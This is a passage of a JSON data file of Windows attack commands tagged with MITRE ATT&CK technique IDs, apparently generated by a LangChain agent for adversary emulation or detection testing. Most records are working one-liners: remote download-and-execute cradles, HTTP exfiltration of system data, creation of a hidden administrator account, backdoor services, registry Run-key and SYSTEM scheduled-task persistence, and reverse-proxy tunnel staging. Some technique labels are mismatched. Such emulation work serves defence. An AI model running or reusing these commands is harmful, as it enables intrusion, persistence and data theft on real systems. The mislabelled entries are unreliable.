      "command": "powershell -Command \"IEX (New-Object Net.WebClient).DownloadString('http://m00nlight.top/proxy.ps1')\"",
      "description": "Execute remote PowerShell script hosted on malicious domain via IEX (Invoke-Expression).",
      "requires_admin": false,
      "safety_level": "high",
      "expected_behavior": "Downloads and executes a remote PowerShell script. This is highly suspicious and often flagged. Execution occurs in memory without disk writes, simulating fileless malware.",
      "source": "langchain",
      "generated_at": "2025-12-21T18:24:38.851968",
      "agent_id": "6a66e652-ec6f-4969-8267-5ceae450f795",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "e076c44a-21d9-475a-ad39-897094d1c2eb",
      "ttp_id": "unknown",
      "technique_id": "T1105",
      "technique_name": "Fast Reverse Proxy",
      "tactic": "execution",
      "platform": "windows",
      "command": "certutil.exe -urlcache -split -f http://192.168.1.100:8080/frp.exe %TEMP%\\\\frp.exe && %TEMP%\\\\frp.exe -c %TEMP%\\\\frp.ini",
      "description": "Download and execute FRP binary using certutil, a built-in Windows utility commonly abused for file transfer. Config file specifies reverse proxy settings.",
      "requires_admin": false,
      "safety_level": "medium",
      "expected_behavior": "Downloads frp.exe from local attacker-controlled server and executes it with a configuration file stored in %TEMP%. Simulates initial staging of FRP.",
      "source": "langchain",
      "generated_at": "2025-12-21T18:24:39.969490",
      "agent_id": "6a66e652-ec6f-4969-8267-5ceae450f795",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "3433ad04-faf5-4f26-a2ec-470c9fbed963",
      "ttp_id": "unknown",
      "technique_id": "T1105",
      "technique_name": "Fast Reverse Proxy",
      "tactic": "execution",
      "platform": "windows",
      "command": "powershell -Command \"Invoke-WebRequest -Uri http://192.168.1.100:8080/frp.exe -OutFile $env:TEMP\\\\frp.exe -ErrorAction SilentlyContinue; Start-Process $env:TEMP\\\\frp.exe -ArgumentList '-c', '$env:TEMP\\\\frp.ini' -WindowStyle Hidden\"",
      "description": "PowerShell-based download and execution of FRP with hidden window. Uses Invoke-WebRequest to fetch payload and execute via Start-Process.",
      "requires_admin": false,
      "safety_level": "medium",
      "expected_behavior": "Silently downloads frp.exe to %TEMP%, then runs it with a config file to establish reverse tunnel. Process runs hidden.",
      "source": "langchain",
      "generated_at": "2025-12-21T18:24:39.969490",
      "agent_id": "6a66e652-ec6f-4969-8267-5ceae450f795",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "efb05504-f9c3-48cf-b8ab-7253d7acf684",
      "ttp_id": "unknown",
      "technique_id": "T1059.001",
      "technique_name": "Fast Reverse Proxy",
      "tactic": "execution",
      "platform": "windows",
      "command": "powershell -Command \"IEX (New-Object Net.WebClient).DownloadString('http://192.168.1.100:8080/frp.ps1'); Start-Frp -ServerAddr '192.168.1.100:8080' -Token 'test123'\"",
      "description": "Download and execute FRP logic directly in memory using PowerShell. No binary written to disk. Simulates fileless execution.",
      "requires_admin": false,
      "safety_level": "high",
      "expected_behavior": "Loads FRP-equivalent PowerShell script directly into memory and executes it, establishing a reverse proxy connection without touching disk. Harder to detect via AV.",
      "source": "langchain",
      "generated_at": "2025-12-21T18:24:39.969490",
      "agent_id": "6a66e652-ec6f-4969-8267-5ceae450f795",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "cf2037e5-943a-4f76-be2b-976957f912c4",
      "ttp_id": "unknown",
      "technique_id": "T1059.001",
      "technique_name": "Command and Scripting Interpreter",
      "tactic": "execution",
      "platform": "windows",
      "command": "cmd.exe /c echo \"System Information Report\" > %TEMP%\\sysinfo.txt & systeminfo >> %TEMP%\\sysinfo.txt & certutil -encode %TEMP%\\sysinfo.txt %TEMP%\\sysinfo.b64 & del %TEMP%\\sysinfo.txt",
      "description": "Gather system information and encode it for exfiltration using built-in Windows tools",
      "requires_admin": false,
      "safety_level": "medium",
      "expected_behavior": "Creates a system info file, base64-encodes it using certutil, and deletes the plaintext. Runs without admin rights but collects basic system data.",
      "source": "langchain",
      "generated_at": "2025-12-21T18:24:40.826779",
      "agent_id": "6a66e652-ec6f-4969-8267-5ceae450f795",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "45b11198-5ce8-47b8-b110-59d942ac8e74",
      "ttp_id": "unknown",
      "technique_id": "T1059.001",
      "technique_name": "Command and Scripting Interpreter",
      "tactic": "execution",
      "platform": "windows",
      "command": "powershell -Command \"try { $data = (ipconfig /all | Out-String); $encoded = [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes($data)); Invoke-WebRequest -Uri http://127.0.0.1:8080/log -Method POST -Body $encoded -Headers @{ 'Content-Type' = 'application/octet-stream' } -UseBasicParsing } catch { }\"",
      "description": "Collect network configuration and exfiltrate via HTTP POST using PowerShell",
      "requires_admin": false,
      "safety_level": "medium",
      "expected_behavior": "Runs ipconfig, encodes output in Base64, and sends it to a local endpoint. Fails silently if destination is unreachable. No data written to disk.",
      "source": "langchain",
      "generated_at": "2025-12-21T18:24:40.826779",
      "agent_id": "6a66e652-ec6f-4969-8267-5ceae450f795",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "d2901917-ceac-45b9-b5f7-90352b0754c4",
      "ttp_id": "unknown",
      "technique_id": "T1059.001",
      "technique_name": "Command and Scripting Interpreter",
      "tactic": "execution",
      "platform": "windows",
      "command": "net user attacker P@ssw0rd123! /add & net localgroup administrators attacker /add",
      "description": "Create a new user and add to local administrators group using legacy net.exe binary",
      "requires_admin": true,
      "safety_level": "high",
      "expected_behavior": "Creates a new local user and elevates to admin group. Requires elevated cmd. Leaves persistent access. High risk due to privilege escalation and account creation.",
      "source": "langchain",
      "generated_at": "2025-12-21T18:24:40.826779",
      "agent_id": "6a66e652-ec6f-4969-8267-5ceae450f795",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "ecab5c20-15d3-4db3-b041-282997bd7855",
      "ttp_id": "unknown",
      "technique_id": "T1059.001",
      "technique_name": "Command and Scripting Interpreter",
      "tactic": "execution",
      "platform": "windows",
      "command": "certutil.exe -urlcache -f http://example.com/malware.bin %TEMP%\\\\stage1.exe && %TEMP%\\\\stage1.exe",
      "description": "Download and execute a file using certutil, a built-in Windows binary commonly abused for payload staging.",
      "requires_admin": false,
      "safety_level": "high",
      "expected_behavior": "Certutil will attempt to download a file from the specified URL to the temp directory and then execute it. Network activity and child process creation from certutil may trigger alerts.",
      "source": "langchain",
      "generated_at": "2025-12-21T18:24:41.666906",
      "agent_id": "6a66e652-ec6f-4969-8267-5ceae450f795",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "38a9f235-4b99-4c25-940c-99ef9c636d66",
      "ttp_id": "unknown",
      "technique_id": "T1059.001",
      "technique_name": "Command and Scripting Interpreter",
      "tactic": "execution",
      "platform": "windows",
      "command": "bitsadmin.exe /transfer n http://example.com/payload.exe %TEMP%\\\\payload.exe && start %TEMP%\\\\payload.exe",
      "description": "Use BITSAdmin to silently download a payload and execute it, leveraging a Windows background transfer service.",
      "requires_admin": false,
      "safety_level": "high",
      "expected_behavior": "BITSAdmin creates a background job to download the file. Upon completion, it executes the payload from the temp directory. This may bypass simple firewall rules due to use of legitimate system service.",
      "source": "langchain",
      "generated_at": "2025-12-21T18:24:41.666906",
      "agent_id": "6a66e652-ec6f-4969-8267-5ceae450f795",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "7858302c-ae18-4163-941b-553fdb86af2f",
      "ttp_id": "unknown",
      "technique_id": "T1059.001",
      "technique_name": "Command and Scripting Interpreter",
      "tactic": "execution",
      "platform": "windows",
      "command": "powershell -Command \"try { $wc = New-Object Net.WebClient; $wc.Headers.Add('User-Agent', 'Mozilla/5.0'); $data = $wc.DownloadData('http://example.com/encoded.ps1'); $decoded = [System.Text.Encoding]::UTF8.GetString($data); Invoke-Expression $decoded } catch { }\"",
      "description": "Download and execute a PowerShell script in memory using WebClient, avoiding disk writes.",
      "requires_admin": false,
      "safety_level": "medium",
      "expected_behavior": "PowerShell creates a web request to fetch a remote script, decodes it in memory, and executes it via Invoke-Expression. No file is written to disk under normal conditions, making detection more difficult.",
      "source": "langchain",
      "generated_at": "2025-12-21T18:24:41.667981",
      "agent_id": "6a66e652-ec6f-4969-8267-5ceae450f795",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "6b6afe65-cd7c-4223-b499-a3b7f9ee9c47",
      "ttp_id": "unknown",
      "technique_id": "T1105",
      "technique_name": "Backdoor",
      "tactic": "execution",
      "platform": "windows",
      "command": "certutil.exe -urlcache -split -f http://192.168.1.100/backdoor.exe %TEMP%\\\\backdoor.exe && start /b %TEMP%\\\\backdoor.exe",
      "description": "Download and execute a backdoor payload using certutil, a built-in Windows utility commonly abused for file transfer.",
      "requires_admin": false,
      "safety_level": "high",
      "expected_behavior": "Attempts to download a file from a remote HTTP server and execute it from the temp directory. The execution is silent (start /b). This simulates initial payload delivery.",
      "source": "langchain",
      "generated_at": "2025-12-21T18:24:42.580726",
      "agent_id": "6a66e652-ec6f-4969-8267-5ceae450f795",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "77b6a89f-d5c2-4464-aa18-e29115305c74",
      "ttp_id": "unknown",
      "technique_id": "T1072",
      "technique_name": "Backdoor",
      "tactic": "execution",
      "platform": "windows",
      "command": "powershell -Command \"IEX (New-Object Net.WebClient).DownloadString('http://192.168.1.100/stager.ps1')\"",
      "description": "Download and execute a PowerShell script from a remote server using WebClient, a common method for executing staged payloads.",
      "requires_admin": false,
      "safety_level": "high",
      "expected_behavior": "Fetches a remote PowerShell script and executes it in memory. Simulates living-off-the-land execution of a backdoor stager.",
      "source": "langchain",
      "generated_at": "2025-12-21T18:24:42.580726",
      "agent_id": "6a66e652-ec6f-4969-8267-5ceae450f795",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "f2ee3e17-fe5d-40eb-b1aa-4c95a33f4b85",
      "ttp_id": "unknown",
      "technique_id": "T1543.003",
      "technique_name": "Backdoor",
      "tactic": "execution",
      "platform": "windows",
      "command": "sc.exe create BackdoorSvc binPath= \"%TEMP%\\\\backdoor.exe\" start= auto && sc.exe start BackdoorSvc",
      "description": "Create and start a Windows service pointing to a backdoor executable, achieving persistence and potential privilege escalation.",
      "requires_admin": true,
      "safety_level": "high",
      "expected_behavior": "Creates a new Windows service named 'BackdoorSvc' that runs a binary from %TEMP%. The service is set to start automatically and is immediately started. Requires administrator privileges.",
      "source": "langchain",
      "generated_at": "2025-12-21T18:24:42.580726",
      "agent_id": "6a66e652-ec6f-4969-8267-5ceae450f795",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "18321de8-1b90-4496-b630-f662a6791ac3",
      "ttp_id": "unknown",
      "technique_id": "T1105",
      "technique_name": "Exploitation for Client Execution",
      "tactic": "execution",
      "platform": "windows",
      "command": "certutil.exe -urlcache -f http://192.168.1.100/payload.exe %TEMP%\\\\update.exe && %TEMP%\\\\update.exe",
      "description": "Download and execute a payload using certutil, a built-in Windows binary often abused for file transfer.",
      "requires_admin": false,
      "safety_level": "high",
      "expected_behavior": "Attempts to download a file from a remote server and execute it from the temp directory. Fails silently if network is unreachable or file is blocked.",
      "source": "langchain",
      "generated_at": "2025-12-21T18:24:43.506971",
      "agent_id": "6a66e652-ec6f-4969-8267-5ceae450f795",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "f435e2ff-1a70-4c72-9fe9-14b3a6bd445a",
      "ttp_id": "unknown",
      "technique_id": "T1088",
      "technique_name": "Exploitation for Client Execution",
      "tactic": "execution",
      "platform": "windows",
      "command": "powershell -Command \"Start-Process notepad.exe -ArgumentList 'C:\\\\Windows\\\\System32\\\\cmd.exe' -Verb RunAs\"",
      "description": "Simulate UAC bypass attempt by spawning a privileged process using PowerShell.",
      "requires_admin": true,
      "safety_level": "medium",
      "expected_behavior": "Triggers a UAC prompt if UAC is enabled. If bypassed, cmd.exe runs with elevated privileges. Otherwise, execution is denied.",
      "source": "langchain",
      "generated_at": "2025-12-21T18:24:43.506971",
      "agent_id": "6a66e652-ec6f-4969-8267-5ceae450f795",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "e543c5d4-ccd4-4d32-825f-b6962a2ca3b9",
      "ttp_id": "unknown",
      "technique_id": "T1547.001",
      "technique_name": "Exploitation for Client Execution",
      "tactic": "execution",
      "platform": "windows",
      "command": "reg add HKCU\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run /v Update /t REG_SZ /d \"C:\\\\Users\\\\Public\\\\update.exe\" /f && copy /y %TEMP%\\\\update.exe C:\\\\Users\\\\Public\\\\update.exe",
      "description": "Establish persistence by adding a program to run at startup via the registry and placing a copy in a public directory.",
      "requires_admin": false,
      "safety_level": "high",
      "expected_behavior": "Adds a new registry key for persistence and copies a file to a startup location. The program will execute on next login.",
      "source": "langchain",
      "generated_at": "2025-12-21T18:24:43.506971",
      "agent_id": "6a66e652-ec6f-4969-8267-5ceae450f795",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "048a062e-ab07-42e6-9410-42d4f1f88395",
      "ttp_id": "unknown",
      "technique_id": "T1105",
      "technique_name": "Server Software Vulnerability",
      "tactic": "execution",
      "platform": "windows",
      "command": "certutil.exe -urlcache -split -f http://192.168.1.100:8080/shell.exe %TEMP%\\\\shell.exe && %TEMP%\\\\shell.exe",
      "description": "Download and execute a malicious payload using certutil, a built-in Windows utility often abused for file download during exploitation.",
      "requires_admin": false,
      "safety_level": "high",
      "expected_behavior": "Certutil connects to the specified HTTP server, downloads the executable to the temp directory, and then executes it. This simulates post-exploitation activity after leveraging a server vulnerability.",
      "source": "langchain",
      "generated_at": "2025-12-21T18:24:44.355068",
      "agent_id": "6a66e652-ec6f-4969-8267-5ceae450f795",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "9ea045c8-0008-455a-9bf9-0fa4535d133e",
      "ttp_id": "unknown",
      "technique_id": "T1059.001",
      "technique_name": "Server Software Vulnerability",
      "tactic": "execution",
      "platform": "windows",
      "command": "powershell -Command \"IEX (New-Object Net.WebClient).DownloadString('http://192.168.1.100:8080/stager.ps1')\"",
      "description": "Use PowerShell to download and execute a remote script, simulating code execution via a vulnerable server process.",
      "requires_admin": false,
      "safety_level": "high",
      "expected_behavior": "PowerShell fetches the remote script from the local attacker-controlled server and executes it in memory. No file is written to disk, making detection more challenging.",
      "source": "langchain",
      "generated_at": "2025-12-21T18:24:44.355068",
      "agent_id": "6a66e652-ec6f-4969-8267-5ceae450f795",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "939e5598-ba6a-40da-9a8c-63db3c604607",
      "ttp_id": "unknown",
      "technique_id": "T1543.003",
      "technique_name": "Server Software Vulnerability",
      "tactic": "execution",
      "platform": "windows",
      "command": "sc.exe create EvilService binPath= \"%TEMP%\\\\shell.exe\" start= auto && sc.exe start EvilService",
      "description": "Create and start a Windows service using sc.exe to maintain persistence after initial exploitation.",
      "requires_admin": true,
      "safety_level": "high",
      "expected_behavior": "The command creates a new service named 'EvilService' pointing to a payload in the temp directory, then starts the service. Requires elevated privileges. Simulates privilege escalation and persistence post-exploitation.",
      "source": "langchain",
      "generated_at": "2025-12-21T18:24:44.355068",
      "agent_id": "6a66e652-ec6f-4969-8267-5ceae450f795",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "18a149f5-5bfe-4007-99ab-a0650713d78e",
      "ttp_id": "unknown",
      "technique_id": "T1105",
      "technique_name": "Remote Access Tools",
      "tactic": "execution",
      "platform": "windows",
      "command": "certutil.exe -urlcache -split -f http://192.168.1.100/frp/frpc.ini %TEMP%\\\\frpc.ini",
      "description": "Download FRP configuration file using certutil, a built-in Windows binary commonly abused for file download.",
      "requires_admin": false,
      "safety_level": "medium",
      "expected_behavior": "Downloads frpc.ini from remote server to %TEMP% directory. No execution occurs, only file transfer.",
      "source": "langchain",
      "generated_at": "2025-12-21T18:24:45.217839",
      "agent_id": "6a66e652-ec6f-4969-8267-5ceae450f795",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "302734ce-dd72-42a1-8af8-058c09930f40",
      "ttp_id": "unknown",
      "technique_id": "T1071.001",
      "technique_name": "Remote Access Tools",
      "tactic": "execution",
      "platform": "windows",
      "command": "powershell -Command \"Set-Content -Path '%TEMP%\\\\frpc_modified.ini' -Value (Get-Content '%TEMP%\\\\frpc.ini') -Force\"",
      "description": "Modify existing FRP config file by reading and rewriting it with PowerShell to simulate configuration tampering.",
      "requires_admin": false,
      "safety_level": "medium",
      "expected_behavior": "Reads original frpc.ini and writes it to a new path with modifications possible in-line. Uses Force to ensure write in restricted temp areas.",
      "source": "langchain",
      "generated_at": "2025-12-21T18:24:45.217839",
      "agent_id": "6a66e652-ec6f-4969-8267-5ceae450f795",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "eeb4a750-e801-466b-8f3f-778800ce9f72",
      "ttp_id": "unknown",
      "technique_id": "T1543.002",
      "technique_name": "Remote Access Tools",
      "tactic": "execution",
      "platform": "windows",
      "command": "cmd /c \"echo [common] > %TEMP%\\\\frpc_test.ini && echo server_addr = 192.168.1.100 >> %TEMP%\\\\frpc_test.ini && echo server_port = 7000 >> %TEMP%\\\\frpc_test.ini && echo authentication_method = token >> %TEMP%\\\\frpc_test.ini && echo token = test123 >> %TEMP%\\\\frpc_test.ini\"",
      "description": "Create a mock FRP configuration file using cmd.exe and echo commands to simulate adversary setup of reverse proxy.",
      "requires_admin": false,
      "safety_level": "low",
      "expected_behavior": "Generates a minimal frpc_test.ini in %TEMP% with C2-like settings. No actual connection is made. Purely file creation.",
      "source": "langchain",
      "generated_at": "2025-12-21T18:24:45.217839",
      "agent_id": "6a66e652-ec6f-4969-8267-5ceae450f795",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "e1ac8390-2bdb-4b24-8dc1-447cda697567",
      "ttp_id": "unknown",
      "technique_id": "T1105",
      "technique_name": "Downloader",
      "tactic": "execution",
      "platform": "windows",
      "command": "certutil.exe -urlcache -split -f http://example.com/malware.bin %TEMP%\\\\malware.bin",
      "description": "Use certutil to download a binary from a remote server and save it to the temp directory",
      "requires_admin": false,
      "safety_level": "medium",
      "expected_behavior": "Attempts to download a file from the specified URL and saves it to the temp directory; may leave traces in certutil cache",
      "source": "langchain",
      "generated_at": "2025-12-21T18:24:45.903275",
      "agent_id": "6a66e652-ec6f-4969-8267-5ceae450f795",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "fe6f94e6-1e24-4376-9939-c8014f82d1c2",
      "ttp_id": "unknown",
      "technique_id": "T1105",
      "technique_name": "Downloader",
      "tactic": "execution",
      "platform": "windows",
      "command": "powershell -Command \"Invoke-WebRequest -Uri http://example.com/payload.txt -OutFile $env:TEMP\\\\payload.txt -ErrorAction SilentlyContinue\"",
      "description": "Use PowerShell to download a payload from a remote server using Invoke-WebRequest",
      "requires_admin": false,
      "safety_level": "medium",
      "expected_behavior": "Downloads a file from the specified URI and saves it to the temp directory; suppresses errors if the request fails",
      "source": "langchain",
      "generated_at": "2025-12-21T18:24:45.903275",
      "agent_id": "6a66e652-ec6f-4969-8267-5ceae450f795",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "8b4d9947-e782-4dfc-bca4-6846e5b7c237",
      "ttp_id": "unknown",
      "technique_id": "T1105",
      "technique_name": "Downloader",
      "tactic": "execution",
      "platform": "windows",
      "command": "bitsadmin.exe /transfer n /download /priority normal http://example.com/test.bin %TEMP%\\\\test.bin",
      "description": "Use BITSAdmin to asynchronously download a file from a remote server",
      "requires_admin": false,
      "safety_level": "medium",
      "expected_behavior": "Creates a BITS job to download a file in the background; job remains visible until completed or cleaned up",
      "source": "langchain",
      "generated_at": "2025-12-21T18:24:45.903275",
      "agent_id": "6a66e652-ec6f-4969-8267-5ceae450f795",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "b327b029-52bb-4876-9521-2ea6ecef54b0",
      "ttp_id": "unknown",
      "technique_id": "T1543.003",
      "technique_name": "Create or Modify System Process",
      "tactic": "execution",
      "platform": "windows",
      "command": "sc.exe create EvilService binPath= \"cmd.exe /c echo 'persistence' > %TEMP%\\\\backdoor.txt\" start= auto",
      "description": "Creates a Windows service using the built-in sc.exe to achieve persistence",
      "requires_admin": true,
      "safety_level": "high",
      "expected_behavior": "A new service named 'EvilService' is created and configured to start automatically. On next reboot or manual start, it writes to a file in %TEMP%. Requires elevated privileges.",
      "source": "langchain",
      "generated_at": "2025-12-21T18:24:47.105033",
      "agent_id": "6a66e652-ec6f-4969-8267-5ceae450f795",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "ad6e3505-707d-4500-bb36-e41b90019fa8",
      "ttp_id": "unknown",
      "technique_id": "T1053.005",
      "technique_name": "Create or Modify System Process",
      "tactic": "execution",
      "platform": "windows",
      "command": "schtasks.exe /create /tn \\Microsoft\\Windows\\Update\\CheckIn /sc once /st 00:00 /tr \"cmd.exe /c whoami > %TEMP%\\\\task_out.txt\" /ru SYSTEM /f",
      "description": "Creates a scheduled task using schtasks.exe that runs as SYSTEM for execution persistence",
      "requires_admin": true,
      "safety_level": "medium",
      "expected_behavior": "A scheduled task named 'CheckIn' is registered under Microsoft\\Windows\\Update namespace to blend in. It runs once at 00:00, executes cmd.exe to run whoami, and outputs to %TEMP%\\\\task_out.txt. The /f flag forces creation if task exists.",
      "source": "langchain",
      "generated_at": "2025-12-21T18:24:47.105033",
      "agent_id": "6a66e652-ec6f-4969-8267-5ceae450f795",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "ccb64a02-e3ff-4514-b264-d4a1355d7dd8",
      "ttp_id": "unknown",
      "technique_id": "T1543.003",
      "technique_name": "Create or Modify System Process",
      "tactic": "execution",
      "platform": "windows",
      "command": "powershell -Command \"try { $cmd = 'cmd.exe /c echo test > %TEMP%\\\\hello.txt'; $service = ([wmiclass]'Win32_Service').Create('PSBackdoor', 'PowerShell Backdoor', \"$cmd\", 16, 2, 'Automatic', $cmd, '', '', '', ''); if ($service.ReturnValue -eq 0) { Write-Output 'Service created successfully.' } } catch { Write-Error $_.Exception.Message }\"",
      "description": "Uses PowerShell to create a Windows service via WMI for stealthy process creation",
      "requires_admin": true,
      "safety_level": "high",
      "expected_behavior": "Leverages WMI through PowerShell to create a service named 'PSBackdoor' with display name 'PowerShell Backdoor'. The service runs a benign command writing to %TEMP%. This method bypasses some logging mechanisms compared to sc.exe.",
      "source": "langchain",
      "generated_at": "2025-12-21T18:24:47.105033",
      "agent_id": "6a66e652-ec6f-4969-8267-5ceae450f795",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "35546ce0-e2a6-42ae-909e-0fd39ac178b5",
      "ttp_id": "unknown",
      "technique_id": "T1059.003",
      "technique_name": "Command and Scripting Interpreter",
      "tactic": "execution",
      "platform": "windows",
      "command": "cmd.exe /c echo Hello from cmd && whoami && ipconfig",
      "description": "Basic command execution using built-in cmd.exe to enumerate system information (user, network config)",
      "requires_admin": false,
      "safety_level": "low",
      "expected_behavior": "Executes three commands in sequence: prints a test message, displays current user context, and shows network configuration. No elevated privileges required. Uses only built-in Windows binaries.",
      "source": "langchain",
      "generated_at": "2025-12-21T18:24:48.239967",
      "agent_id": "6a66e652-ec6f-4969-8267-5ceae450f795",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "89959ff5-cf46-40fc-8f2d-a862779bffc9",
      "ttp_id": "unknown",
      "technique_id": "T1059.003",
      "technique_name": "Command and Scripting Interpreter",
      "tactic": "execution",
      "platform": "windows",
      "command": "cmd.exe /c net user attacker P@ssw0rd123 /add && net localgroup administrators attacker /add",
      "description": "Adds a new local user and promotes it to the Administrators group using legacy net.exe binary",
      "requires_admin": true,
      "safety_level": "high",
      "expected_behavior": "Creates a new user account 'attacker' with a password and adds it to the local administrators group. Requires elevated command prompt. Leaves forensic traces in security logs. Destructive in real environments due to account creation.",
      "source": "langchain",
      "generated_at": "2025-12-21T18:24:48.239967",
      "agent_id": "6a66e652-ec6f-4969-8267-5ceae450f795",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "eca4f5e1-953f-404d-b9b0-d065bf4f4ae4",
      "ttp_id": "unknown",
      "technique_id": "T1059.001",
      "technique_name": "Command and Scripting Interpreter",
      "tactic": "execution",
      "platform": "windows",
      "command": "powershell -Command \"try { $webRequest = [System.Net.WebRequest]::Create('http://127.0.0.1:8000/stager'); $response = $webRequest.GetResponse(); $stream = $response.GetResponseStream(); $reader = New-Object System.IO.StreamReader($stream); $command = $reader.ReadToEnd(); Invoke-Expression $command; } catch { } \"",
      "description": "Intermediate PowerShell-based command execution via simulated C2 stager download and in-memory execution",
      "requires_admin": false,
      "safety_level": "medium",
      "expected_behavior": "Attempts to connect to a local HTTP server to retrieve and execute a command string in memory. Uses .NET classes via PowerShell to avoid direct Invoke-WebRequest. Fails silently if no server is running. No file written to disk. Safe for testing if no actual payload is served.",
      "source": "langchain",
      "generated_at": "2025-12-21T18:24:48.239967",
      "agent_id": "6a66e652-ec6f-4969-8267-5ceae450f795",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "d4f39040-aa54-4b35-ab5a-a3e28d640e74",
      "ttp_id": "unknown",
      "technique_id": "T1197",
      "technique_name": "System Utilities",
      "tactic": "execution",
      "platform": "windows",
      "command": "bitsadmin /transfer job /download /priority normal http://192.168.1.100/payload.exe %TEMP%\\update.exe",
      "description": "Download a file using bitsadmin, a Windows command-line utility commonly abused to transfer payloads silently.",
      "requires_admin": false,
      "safety_level": "medium",
      "expected_behavior": "Creates a BITS job named 'job' to download payload.exe from the specified URL and saves it as update.exe in the user's TEMP directory. The job will complete silently if the server is reachable.",
      "source": "langchain",
      "generated_at": "2025-12-21T18:24:49.539216",
      "agent_id": "6a66e652-ec6f-4969-8267-5ceae450f795",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "715b99de-094b-4e8a-be71-02337a00f175",
      "ttp_id": "unknown",
      "technique_id": "T1197",
      "technique_name": "System Utilities",
      "tactic": "execution",
      "platform": "windows",
      "command": "bitsadmin /transfer job2 /download /priority normal http://malicious.local/data.txt %TEMP%\\log.txt && certutil -urlcache -split -f %TEMP%\\log.txt",
      "description": "Download a file with bitsadmin and verify its contents using certutil, simulating data exfiltration or beaconing behavior.",
      "requires_admin": false,
      "safety_level": "medium",
      "expected_behavior": "Downloads data.txt to log.txt in TEMP, then uses certutil to parse and display the cached content. This chain mimics how adversaries may use multiple built-in tools to avoid detection.",
      "source": "langchain",
      "generated_at": "2025-12-21T18:24:49.539216",
      "agent_id": "6a66e652-ec6f-4969-8267-5ceae450f795",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "9dfaf228-0979-4dca-86e6-c1f522610304",
      "ttp_id": "unknown",
      "technique_id": "T1197",
      "technique_name": "System Utilities",
      "tactic": "execution",
      "platform": "windows",
      "command": "powershell -Command \"try { $url = 'http://192.168.1.100/shell.ps1'; $output = '$env:TEMP\\\\task.ps1'; Start-BitsTransfer -Source $url -Destination $output -ErrorAction Stop; Invoke-Expression -Command $output -ErrorAction Stop } catch { Exit 1 }\"",
      "description": "Use PowerShell with Start-BitsTransfer to silently download and execute a script, demonstrating abuse of BITS via PowerShell for execution.",
      "requires_admin": false,
      "safety_level": "high",
      "expected_behavior": "Attempts to download shell.ps1 from the given URL to task.ps1 in TEMP using BITS. If successful, executes the script in memory. Any failure results in exit code 1. This command is marked high risk due to script execution.",
      "source": "langchain",
      "generated_at": "2025-12-21T18:24:49.539216",
      "agent_id": "6a66e652-ec6f-4969-8267-5ceae450f795",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "f5610601-3312-4771-8adb-430996df68e8",
      "ttp_id": "unknown",
      "technique_id": "T1140",
      "technique_name": "System Utilities",
      "tactic": "execution",
      "platform": "windows",
      "command": "certutil.exe -urlcache -split -f http://192.168.1.100/payload.bin %TEMP%\\\\staged_payload.exe",
      "description": "Download a payload using certutil, a built-in Windows utility often abused for downloading malware or staging payloads.",
      "requires_admin": false,
      "safety_level": "high",
      "expected_behavior": "Attempts to download a file from a remote server and save it to the TEMP directory. Will fail silently if no network connectivity or server is unreachable. Uses built-in Windows certutil.exe for HTTP retrieval.",
      "source": "langchain",
      "generated_at": "2025-12-21T18:24:50.589944",
      "agent_id": "6a66e652-ec6f-4969-8267-5ceae450f795",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "cc9505ad-aa20-4a20-9408-f50c3816ee41",
      "ttp_id": "unknown",
      "technique_id": "T1140",
      "technique_name": "System Utilities",
      "tactic": "execution",
      "platform": "windows",
      "command": "certutil.exe -decode %TEMP%\\\\encoded.txt %TEMP%\\\\decoded_payload.exe",
      "description": "Decode a Base64-encoded file using certutil, simulating decoding of an obfuscated payload.",
      "requires_admin": false,
      "safety_level": "medium",
      "expected_behavior": "Decodes a file using certutil's Base64 decoding capability. Requires a pre-existing encoded file. Output is written to the TEMP directory. Commonly used to decode payloads delivered in text format.",
      "source": "langchain",
      "generated_at": "2025-12-21T18:24:50.589944",
      "agent_id": "6a66e652-ec6f-4969-8267-5ceae450f795",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "ec9c8a08-9e3e-4a6f-8ff2-3413d4951b74",
      "ttp_id": "unknown",
      "technique_id": "T1105",
      "technique_name": "System Utilities",
      "tactic": "execution",
      "platform": "windows",
      "command": "powershell -Command \"try { $wc = New-Object Net.WebClient; $wc.Headers.Add('User-Agent', 'Mozilla/5.0'); $data = $wc.DownloadData('http://192.168.1.100/script.txt'); [System.Text.Encoding]::ASCII.GetString($data) | Out-File %TEMP%\\\\\\\"retrieved.txt\\\"\" -ErrorAction SilentlyContinue } catch { }\"",
